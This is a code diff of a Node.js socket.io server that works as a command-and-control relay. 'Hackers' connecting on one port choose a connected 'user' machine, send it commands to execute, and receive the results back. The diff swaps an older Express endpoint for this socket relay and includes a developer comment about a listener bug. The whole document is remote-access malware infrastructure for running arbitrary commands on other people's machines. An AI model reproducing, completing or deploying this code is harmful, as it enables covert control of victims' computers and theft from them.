@@ -1,18 +1,9 @@
-const express = require("express");
-const bodyParser = require("body-parser");
-const http = require("http");
-// const io = require("socket.io")(http);
 const SEND_PORT = 7681;
 const REC_PORT = 7670;
 const io = require("socket.io");
 
 const sendIO = io.listen(SEND_PORT);
 const recIO = io.listen(REC_PORT);
-
-const app = express();
-
-app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true }));
 
 const users = {};
 const hackers = {};
@@ -27,11 +18,11 @@ sendIO.on("connection", (socket) => {
     users[socketUser] = socket;
   });
 
-  socket.on("performed-command", (data) => {
-    const { command, result } = data;
-    log("command", `${command}`);
-    log("result", `${result}`);
-  });
+  // socket.on("performed-command", (data) => {
+  //   const { command, result } = data;
+  //   log("command", `${command}`);
+  //   log("result", `${result}`);
+  // });
 
   socket.on("disconnect", () => {
     log("disconnect", `${socketUser}`);
@@ -39,7 +30,6 @@ sendIO.on("connection", (socket) => {
   });
 });
 
-//Replace this with receiver socket once finished
 recIO.on("connection", (socket) => {
   let socketUser = "";
   let currentConnection = "";
@@ -73,21 +63,19 @@ recIO.on("connection", (socket) => {
     socket.emit("return");
   });
 
+  socket.on("perform-command", (command) => {
+    users[currentConnection].emit("perform-command", command);
+    //This is the issue. Don't create listeners within listeners.
+    users[currentConnection].on("performed-command", (data) => {
+      socket.emit("performed-command", data);
+    });
+  });
+
   socket.on("disconnect", () => {
     log("hacker disconnect", `${socketUser}`);
     delete hackers[socketUser];
   });
 });
-
-// app.get("/sendCommand/:user/:command", (req, res) => {
-//   const { user, command } = req.params;
-//   users[user].emit("perform-command", command);
-//   return res.json({ yes: 1 });
-// });
-
-// app.listen(REC_PORT, () => {
-//   console.log(`Remote Controller Server is listening on port ${REC_PORT}`);
-// });
 
 function log(title, message) {
   console.log(`[${title.toUpperCase()}] ${message}`);
